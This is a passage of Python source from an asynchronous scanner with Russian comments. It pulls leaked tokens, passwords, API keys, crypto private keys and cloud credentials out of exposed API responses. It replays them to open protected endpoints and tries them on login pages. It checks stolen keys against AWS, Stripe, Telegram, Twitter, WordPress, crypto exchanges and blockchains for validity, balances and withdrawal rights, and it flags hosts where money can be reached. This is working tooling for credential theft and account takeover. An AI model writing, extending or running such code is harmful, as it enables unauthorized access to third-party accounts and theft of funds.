                                            for tok in extract_facebook_tokens(fbody[:100_000]):
                                                if tok not in facebook_tokens_seen \
                                                        and len(facebook_tokens_found) < cfg.facebook_verify_max:
                                                    facebook_tokens_seen.add(tok)
                                                    facebook_tokens_found.append(tok)
                                        if cfg.key_balance_checks:
                                            for e in extract_crypto_keys(fbody[:100_000]):
                                                sig = (e["kind"], e["value"])
                                                if sig not in crypto_keys_seen \
                                                        and len(crypto_keys_found) < cfg.key_balance_max:
                                                    crypto_keys_seen.add(sig)
                                                    crypto_keys_found.append(e)
                                        if cfg.ai_key_checks:
                                            for prov, k in extract_ai_keys(fbody[:100_000]):
                                                ai_keys_found.setdefault(k, prov)
                                        if cfg.twilio_checks:
                                            twilio_pairs_found.update(
                                                extract_twilio_pairs(fbody[:100_000]))
                                        # replay-входы из фазовых тел (креды от WP и др.)
                                        if cfg.session_replay:
                                            _replay_sessions_from_text(
                                                fbody[:100_000], replay_sessions,
                                                replay_sessions_seen, cfg.session_replay_max)
                                        if cfg.cred_replay:
                                            _replay_creds_from_text(
                                                fbody[:100_000], replay_creds,
                                                replay_creds_seen, cfg.cred_replay_max)
                                        if cfg.apikey_replay:
                                            _replay_apikeys_from_text(
                                                fbody[:100_000], replay_apikeys,
                                                replay_apikeys_seen, cfg.apikey_replay_max)
                                except (aiohttp.ClientError, asyncio.TimeoutError):
                                    continue
                    if not fuzz_new:
                        # новых подстановочных значений больше нет - сошлось
                        break

            # Фаза 3 — replay: вход, найденный в 200-телах, подставляется в
            # protected GET (401/403 из фазы 1). Виды входа:
            #   bearer  - access_token -> Authorization: Bearer (token_replay)
            #   session - session_id/sid -> Cookie (session_replay)
            #   cred    - найденная пара логин+пароль / Basic -> Basic (cred_replay)
            #   apikey  - api_key -> X-API-Key (apikey_replay)
            # Открылся - auth bypass; replay_admin/replay_money - открытая
            # сессия админская или с деньгами. Только GET - пассивно.
            replay_attempts: list[tuple[str, str, str]] = []  # (kind, value, name)
            if cfg.token_replay:
                replay_attempts += [("bearer", tok, "") for tok in auth_tokens_found]
            if cfg.session_replay:
                replay_attempts += [("session", v, n) for (n, v) in replay_sessions]
            if cfg.cred_replay:
                replay_attempts += [("cred", f"{u}:{p}", u) for (u, p) in replay_creds]
            if cfg.apikey_replay:
                replay_attempts += [("apikey", k, "") for k in replay_apikeys]
            if replay_attempts and protected_gets:
                replay_seen: set[tuple[str, str, str]] = set()
                # per-вход агрегатор: что именно открыл (для панели)
                tr_by_token: dict[tuple[str, str], dict[str, Any]] = {
                    (kind, value): {"kind": kind, "token": value, "name": name,
                                    "source": auth_token_sources.get(value, ""),
                                    "opened": [], "admin": False, "money": False,
                                    "money_value": "", "identity": ""}
                    for kind, value, name in replay_attempts
                }
                token_replay_checks: list[dict[str, Any]] = []
                for tmpl, ppath in protected_gets:
                    if time.monotonic() >= deadline:
                        break
                    for kind, rvalue, rname in replay_attempts:
                        if time.monotonic() >= deadline:
                            break
                        if (ppath, kind, rvalue) in replay_seen:
                            continue
                        replay_seen.add((ppath, kind, rvalue))
                        # заголовок входа по виду
                        if kind == "bearer":
                            rheaders = {"Authorization": f"Bearer {rvalue}"}
                        elif kind == "session":
                            # имя поля + стандартные синонимы в одной куке
                            rheaders = {"Cookie": f"{rname}={rvalue}; session_id={rvalue}"
                                                  f"; sessionid={rvalue}; sid={rvalue}; JSESSIONID={rvalue}"}
                        elif kind == "cred":
                            rheaders = {"Authorization":
                                        "Basic " + base64.b64encode(rvalue.encode()).decode()}
                        else:  # apikey
                            rheaders = {"X-API-Key": rvalue}
                        try:
                            async with session.get(
                                base_url.rstrip("/") + ppath,
                                headers={**rheaders, "Accept": "application/json"},
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
                                proxy=proxy,
                            ) as rresp:
                                if rresp.status != 200:
                                    continue
                                rbody = await rresp.text()
                                rpatterns, rsev = classify_response(rbody[:100_000])
                                # что за сессия открылась: админ / деньги / личность
                                tr = tr_by_token.get((kind, rvalue)) or {}
                                if tr:
                                    tr["opened"].append(ppath.split("#")[0])
                                    if REPLAY_ADMIN_RE.search(rbody[:2000]) \
                                            or "/admin" in (tmpl + ppath).lower():
                                        tr["admin"] = True
                                        if "replay_admin" not in rpatterns:
                                            rpatterns.append("replay_admin")
                                    mm = REPLAY_MONEY_RE.search(rbody[:2000])
                                    if mm:
                                        try:
                                            if float(mm.group(1)) > 0:
                                                tr["money"] = True
                                                tr["money_value"] = mm.group(1)
                                                if "replay_money" not in rpatterns:
                                                    rpatterns.append("replay_money")
                                        except ValueError:
                                            pass
                                    if not tr["identity"]:
                                        idm = REPLAY_ID_RE.search(rbody[:2000])
                                        if idm:
                                            tr["identity"] = idm.group(1)[:80]
                                # закрытый эндпоинт открылся входом - finding
                                rtag = {"bearer": "token_replay", "session": "session_replay",
                                        "cred": "cred_replay", "apikey": "apikey_replay"}[kind]
                                if rtag not in rpatterns:
                                    rpatterns.append(rtag)
                                rsev = "CRITICAL" if severity_order.get(
                                    rsev, 0) < 3 else rsev
                                all_patterns.extend(rpatterns)
                                rresp_data: dict[str, Any] = {
                                    # панель: шаблон + пометка входа (kind)
                                    "path": tmpl + "#" + {"bearer": "auth", "session": "sess",
                                                          "cred": "cred", "apikey": "key"}[kind],
                                    "method": "GET",
                                    "expects_auth": True,
                                    "status_code": rresp.status,
                                    "verdict": "VULNERABLE",
                                    "patterns": rpatterns,
                                    "response": None,
                                }
                                try:
                                    rresp_data["response"] = json.loads(rbody)
                                except (json.JSONDecodeError, ValueError):
                                    rresp_data["response"] = rbody[:100_000]
                                endpoints_data.append(rresp_data)
                                result.total_endpoints += 1
                                result.vulnerable_count += 1
                                if severity_order.get(rsev, 0) > severity_order.get(max_severity, 0):
                                    max_severity = rsev
                                if severity_order.get(max_severity, 0) < 3:
                                    max_severity = "CRITICAL"
                                # фиды для verify-блоков ниже
                                if cfg.secret_checks:
                                    secrets_found.update(extract_secrets(rbody[:100_000]))
                                if cfg.wp_checks:
                                    if '"wp_user' in rbody or '"wp_pass' in rbody:
                                        wp_panel_seen = True
                                    wp_pairs_found.extend(
                                        extract_wp_creds(rbody[:100_000], fallback_url=base_url))
                                if cfg.facebook_checks:
                                    for tok in extract_facebook_tokens(rbody[:100_000]):
                                        if tok not in facebook_tokens_seen \
                                                and len(facebook_tokens_found) < cfg.facebook_verify_max:
                                            facebook_tokens_seen.add(tok)
                                            facebook_tokens_found.append(tok)
                                if cfg.key_balance_checks:
                                    for e in extract_crypto_keys(rbody[:100_000]):
                                        sig = (e["kind"], e["value"])
                                        if sig not in crypto_keys_seen \
                                                and len(crypto_keys_found) < cfg.key_balance_max:
                                            crypto_keys_seen.add(sig)
                                            crypto_keys_found.append(e)
                                if cfg.integration_checks:
                                    for entry in extract_integrations(rbody[:100_000]):
                                        if entry["api_key"] not in integration_entries_seen:
                                            integration_entries_seen.add(entry["api_key"])
                                            integrations_found.append(entry)
                                if cfg.ai_key_checks:
                                    for prov, k in extract_ai_keys(rbody[:100_000]):
                                        ai_keys_found.setdefault(k, prov)
                                # входы из ОТКРЫТОГО ответа (сессии/креды/api-keys)
                                if cfg.session_replay:
                                    _replay_sessions_from_text(
                                        rbody[:100_000], replay_sessions,
                                        replay_sessions_seen, cfg.session_replay_max)
                                if cfg.cred_replay:
                                    _replay_creds_from_text(
                                        rbody[:100_000], replay_creds,
                                        replay_creds_seen, cfg.cred_replay_max)
                                if cfg.apikey_replay:
                                    _replay_apikeys_from_text(
                                        rbody[:100_000], replay_apikeys,
                                        replay_apikeys_seen, cfg.apikey_replay_max)
                        except (aiohttp.ClientError, asyncio.TimeoutError):
                            continue
                # в result.data идут только входы, реально открывшие
                # защищённые эндпоинты (с identity/admin/money-атрибутами)
                token_replay_checks = [tr for tr in tr_by_token.values() if tr["opened"]]

            # Фаза 4 — cred-проверка: найденные пары логин+пароль (из тел,
            # placeholder/masked отсеяны) пробуются на login-эндпоинте
            # ОДНОЙ попыткой. Это не брутфорс - проверка реально утёкших
            # секретов. 200 + токен/профиль = валидный аккаунт (чекер)
            if cfg.login_checks and replay_creds and login_paths:
                for u, p in list(replay_creds)[: cfg.login_check_max]:
                    chk = await check_login(
                        session, base_url, login_paths[0], u, p,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    login_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("login_valid")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"
                        if chk.get("admin"):
                            all_patterns.append("login_admin")

            # Проверка AI-ключей: валидность/баланс у провайдеров
            # (только бесплатные эндпоинты - списания нет)
            ai_key_checks: list[dict[str, Any]] = []
            if cfg.ai_key_checks and ai_keys_found:
                for k, prov in list(ai_keys_found.items())[: cfg.ai_key_max]:
                    chk = await verify_ai_key(
                        session, prov, k,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    ai_key_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("ai_key_valid")
                        if severity_order.get(max_severity, 0) < 2:
                            max_severity = "HIGH"

            # Проверка telegram-ботов: жив ли бот (getMe, через прокси);
            # у живых ищем платёжные команды - бот-касса = канал денег
            telegram_checks: list[dict[str, Any]] = []
            if cfg.telegram_bot_checks and telegram_bots_found:
                for token in list(telegram_bots_found)[: cfg.telegram_bot_max]:
                    chk = await verify_telegram_bot(
                        session, token,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    telegram_checks.append(chk)
                    if chk["status"] == "valid":
                        if chk.get("money"):
                            # Живой бот с платёжными командами (вывод/баланс)
                            all_patterns.append("telegram_bot_money")
                            if severity_order.get(max_severity, 0) < 3:
                                max_severity = "CRITICAL"
                        else:
                            all_patterns.append("telegram_bot_valid")
                            if severity_order.get(max_severity, 0) < 2:
                                max_severity = "HIGH"

            # Проверка AWS-пар: STS GetCallerIdentity (SigV4, через прокси)
            aws_key_checks: list[dict[str, Any]] = []
            if cfg.aws_key_checks and aws_keypairs_found:
                for access_key, secret, sess_token in list(aws_keypairs_found)[: cfg.aws_key_max]:
                    chk = await verify_aws_keypair(
                        session, access_key, secret, session_token=sess_token,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    aws_key_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("aws_key_valid")
                        if severity_order.get(max_severity, 0) < 2:
                            max_severity = "HIGH"

            # Проверка DSN: доступен ли хост, работают ли креды (postgres).
            # Внутренние хосты (localhost/docker) проверяем на публичном IP цели.
            dsn_checks: list[dict[str, Any]] = []
            if cfg.dsn_checks and dsns_found:
                for d in list(dsns_found)[: cfg.dsn_max]:
                    chk = await check_dsn(
                        d, timeout_s=max(cfg.check_timeout, 5),
                        target_host=row.host,
                    )
                    dsn_checks.append(chk)
                    if chk["status"] == "auth_ok":
                        # Креды работают - полный доступ к БД
                        all_patterns.append("dsn_auth_ok")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"
                    elif chk["status"] == "reachable":
                        all_patterns.append("dsn_reachable")
                        if severity_order.get(max_severity, 0) < 1:
                            max_severity = "MEDIUM"

            # Проверка сервисных секретов: stripe (баланс!), slack, discord,
            # github, gitlab, mailgun, sendgrid, npm, dropbox (read-only)
            secret_checks: list[dict[str, Any]] = []
            if cfg.secret_checks and secrets_found:
                kind_checked: dict[str, int] = {}
                for kind, val in sorted(secrets_found)[: cfg.secret_max]:
                    # Discord банирует по rate-limit: проверяем максимум N токенов
                    # с одного хоста, остальные остаются как находки без проверки
                    if kind == "discord" and kind_checked.get("discord", 0) >= cfg.discord_verify_max:
                        continue
                    kind_checked[kind] = kind_checked.get(kind, 0) + 1
                    chk = await verify_secret(
                        session, kind, val,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    secret_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append(f"{kind}_key_valid"
                                             if kind in ("stripe", "mailgun", "sendgrid")
                                             else f"{kind}_token_valid")
                        sev = SEVERITY_MAP.get(all_patterns[-1], "HIGH")
                        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                            max_severity = sev

            # Twilio-пары: HTTP Basic, read-only
            twilio_checks: list[dict[str, Any]] = []
            if cfg.twilio_checks and twilio_pairs_found:
                for sid, tok in list(twilio_pairs_found)[: cfg.twilio_max]:
                    chk = await verify_twilio_pair(
                        session, sid, tok,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    twilio_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("twilio_pair_valid")
                        if severity_order.get(SEVERITY_MAP["twilio_pair_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["twilio_pair_valid"]

            # Twitter/X app bearer
            twitter_checks: list[dict[str, Any]] = []
            if cfg.twitter_checks and twitter_bearers_found:
                for tok in list(twitter_bearers_found)[: cfg.twitter_max]:
                    chk = await verify_twitter_bearer(
                        session, tok,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    twitter_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("twitter_token_valid")
                        if severity_order.get(SEVERITY_MAP["twitter_token_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["twitter_token_valid"]

            # Twitter/X сессии (cookies auth_token+ct0 из чекер-панелей)
            twitter_session_checks: list[dict[str, Any]] = []
            if cfg.twitter_checks and twitter_sessions_found:
                for tses in twitter_sessions_found[: cfg.twitter_session_max]:
                    chk = await verify_twitter_session(
                        session, tses["auth_token"], tses["ct0"],
                        screen_name=tses["username"],
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    chk["username"] = tses["username"]
                    twitter_session_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("twitter_session_valid")
                        if severity_order.get(SEVERITY_MAP["twitter_session_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["twitter_session_valid"]

            # Биржевые ключи: HMAC, read-only — баланс + право вывода (связка)
            exchange_checks: list[dict[str, Any]] = []
            if cfg.exchange_checks and exchange_pairs_found:
                for p in exchange_pairs_found[: cfg.exchange_max]:
                    chk = await verify_exchange_keypair(
                        session, p["exchange"], p["key"], p["secret"],
                        passphrase=p["passphrase"],
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    exchange_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("exchange_key_valid")
                        if severity_order.get(SEVERITY_MAP["exchange_key_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["exchange_key_valid"]
                        if chk.get("withdraw_enabled") is True:
                            all_patterns.append("exchange_withdraw_enabled")

            # Крипто-платёжки (heleket/cryptomus/nowpayments/plisio):
            # read-only баланс, ключ = приём платежей + выплаты
            cryptopay_checks: list[dict[str, Any]] = []
            if cfg.cryptopay_checks and cryptopay_keys_found:
                for p in cryptopay_keys_found[: cfg.cryptopay_max]:
                    chk = await verify_cryptopay_key(
                        session, p["service"], p["key"], merchant=p["merchant"],
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    cryptopay_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("cryptopay_key_valid")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"

            # WordPress finder: креды админок сайтов, найденные в телах
            # (wp_user/wp_password), плюс активный обход /api/sites (все сайты
            # одним списком). Верификация read-only GET /wp-json/wp/v2/users/me
            wp_checks: list[dict[str, Any]] = []
            if cfg.wp_checks and wp_panel_seen:
                # активный пробер: /api/sites отдаёт весь список сайтов
                try:
                    probed = await probe_wp_sites(
                        session, base_url, proxy=proxy,
                        timeout_s=max(cfg.check_timeout, 8),
                    )
                    if probed:
                        wp_pairs_found.extend(probed)
                except Exception as exc:  # noqa: BLE001 - пробер не должен ломать скан
                    wp_panel_seen = False
                    log.debug("wp probe failed: %s", exc)

                seen_pairs: set[tuple[str, str, str]] = set()
                for e in wp_pairs_found:
                    sig = (e.get("site_url") or base_url, e.get("user", ""), e.get("password", ""))
                    if sig not in seen_pairs:
                        seen_pairs.add(sig)
                        chk = await verify_wp_creds(
                            session, sig[0], e["user"], e["password"],
                            proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                        )
                        wp_checks.append(chk)
                        if chk["status"] == "valid":
                            all_patterns.append("wp_creds_valid")
                            if severity_order.get(max_severity, 0) < 3:
                                max_severity = "CRITICAL"
                        if len(wp_checks) >= cfg.wp_verify_max:
                            break

            # Активная проба самого хоста как WordPress-админки: не только
            # утечки wp_user в чужих панелях, но и живые wp-login.php /
            # REST-перечисление пользователей. Read-only GET, короткий таймаут.
            if cfg.wp_checks:
                wp_probe = await probe_wp_admin(session, base_url, proxy=proxy)
                if wp_probe.get("login"):
                    all_patterns.append("wp_login_found")
                    if severity_order.get(max_severity, 0) < 1:
                        max_severity = "MEDIUM"
                if wp_probe.get("users_enum"):
                    all_patterns.append("wp_users_enum")
                    if severity_order.get(max_severity, 0) < 2:
                        max_severity = "HIGH"
                if wp_probe.get("login") or wp_probe.get("users_enum"):
                    wp_checks.append(wp_probe)

            # Facebook EAA-токены: GET graph /me (read-only) = живые аккаунты
            facebook_checks: list[dict[str, Any]] = []
            if cfg.facebook_checks and facebook_tokens_found:
                for tok in facebook_tokens_found[: cfg.facebook_verify_max]:
                    chk = await verify_facebook(
                        session, tok, proxy=proxy, timeout_s=8.0,
                    )
                    facebook_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("facebook_valid")
                        if severity_order.get(max_severity, 0) < 2:
                            max_severity = "HIGH"

            # Приват-ключи: адрес → БЕСПЛАТНЫЙ on-chain баланс нативных монет.
            # Ключ с балансом = почти голые деньги (ETH/BSC/SOL/BTC)
            key_balance_checks: list[dict[str, Any]] = []
            if cfg.key_balance_checks and crypto_keys_found:
                for e in crypto_keys_found[: cfg.key_balance_max]:
                    chk = await check_key_balance(
                        session, e["kind"], e["value"],
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 12),
                    )
                    key_balance_checks.append(chk)
                    if chk.get("total", 0) > 0:
                        all_patterns.append("private_key_money")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"

            # Интеграции панелей (service_type+api_key): Bearer-проба known-
            # сервисов (clickadu balance, clickadilla profile, cloudflare).
            integration_checks: list[dict[str, Any]] = []
            if cfg.integration_checks and integrations_found:
                integration_seen: set[str] = set()
                for entry in integrations_found:
                    stype = entry.get("service_type", "")
                    key = entry.get("api_key", "")
                    sig = (stype, key)
                    if sig in integration_seen or not key:
                        continue
                    integration_seen.add(sig)
                    chk = await verify_integration(
                        session, stype, key, name=entry.get("name", ""),
                        endpoint=entry.get("endpoint", ""),
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    integration_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("integration_valid")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"
                    if len(integration_checks) >= cfg.integration_verify_max:
                        break

            # Money-корреляция: withdraw-эндпоинты + проверенные денежные
            # ключи на одном хосте = самая ценная цель (деньги и вход в одном месте)
            money_verified = (
                any(c.get("status") == "valid" for c in exchange_checks)
                or any(c.get("status") == "valid" for c in cryptopay_checks)
                or any(c.get("status") == "valid" for c in twitter_session_checks)
                or any(c.get("status") == "valid" and c.get("money") for c in telegram_checks)
                or any(c.get("status") == "valid" and c.get("kind") == "stripe" for c in secret_checks)
                or any(c.get("status") == "auth_ok" for c in dsn_checks)
                or any(c.get("status") == "valid" for c in wp_checks)
                or any(c.get("status") == "valid" for c in integration_checks)
            )
            if money_verified and any(
                "withdraw_endpoint" in (ep.get("patterns") or [])
                and "withdraw_noise" not in (ep.get("patterns") or [])
                for ep in endpoints_data
            ):
                all_patterns.append("money_target")
                if severity_order.get(max_severity, 0) < 3:
                    max_severity = "CRITICAL"

            result.endpoints = endpoints_data
            result.data_patterns = list(set(all_patterns))
            result.severity = max_severity

            # Фильтруем только эндпоинты с паттернами (реальные находки)
            vulnerable_eps = [
                {
                    "path": ep["path"],
                    "method": ep["method"],
                    "status": ep["status_code"],
                    "verdict": ep["verdict"],
                    "patterns": ep["patterns"],
                    "response": ep.get("response"),
                }
                for ep in endpoints_data
                if ep.get("patterns")  # только с реальными паттернами
            ]

            # Money rule: хосты с withdraw-эндпоинтами выделяем явно
            # (HTML-заглушки не считаем - эндпоинта фактически нет)
            withdraw_eps = [
                ep for ep in vulnerable_eps
                if "withdraw_endpoint" in ep["patterns"]
                and "withdraw_noise" not in ep["patterns"]
            ]

            result.data = {
                "spec_title": result.spec_title,
                "endpoints_tested": result.total_endpoints,
                "vulnerable": vulnerable_eps,
                "withdraw_capable": bool(withdraw_eps),
                "ai_key_checks": ai_key_checks,
                "telegram_checks": telegram_checks,
                "aws_key_checks": aws_key_checks,
                "dsn_checks": dsn_checks,
                "secret_checks": secret_checks,
                "twilio_checks": twilio_checks,
                "twitter_checks": twitter_checks,
                "twitter_session_checks": twitter_session_checks,
                "twitter_sessions_total": twitter_sessions_total,
                "exchange_checks": exchange_checks,
                "cryptopay_checks": cryptopay_checks,
                "wp_checks": wp_checks,
                "facebook_checks": facebook_checks,
                "key_balance_checks": key_balance_checks,
                "token_replay_checks": token_replay_checks,
                "login_checks": login_checks,
                "integration_checks": integration_checks,
            }

    except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
        result.is_alive = False
        result.data = {"error": type(exc).__name__}

    return result
